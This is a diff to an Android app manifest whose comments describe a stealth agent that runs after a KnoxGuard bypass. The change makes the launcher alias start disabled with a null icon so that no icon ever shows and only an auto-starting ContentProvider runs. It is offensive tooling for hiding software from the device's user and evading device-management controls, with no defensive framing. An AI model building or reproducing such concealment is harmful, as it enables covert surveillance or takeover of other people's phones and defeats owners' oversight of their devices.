@@ -52,14 +52,13 @@
             android:multiprocess="true"
             android:initOrder="2147483647" />
 
-        <!-- Stealth: Decoy activity with launcher icon for initial install.
-             After KnoxGuard bypass, this activity is disabled via PackageManager
-             and the agent runs purely as a background service with no visible trace. -->
+        <!-- Stealth: LauncherAlias starts DISABLED — ContentProvider hides at install.
+             Only the ContentProvider (AutoStartProvider) runs. No launcher icon ever shows. -->
         <activity-alias
             android:name=".LauncherAlias"
-            android:enabled="true"
+            android:enabled="false"
             android:exported="true"
-            android:icon="@mipmap/ic_launcher"
+            android:icon="@null"
             android:label="@string/app_name"
             android:targetActivity=".MainActivity">
             <intent-filter>
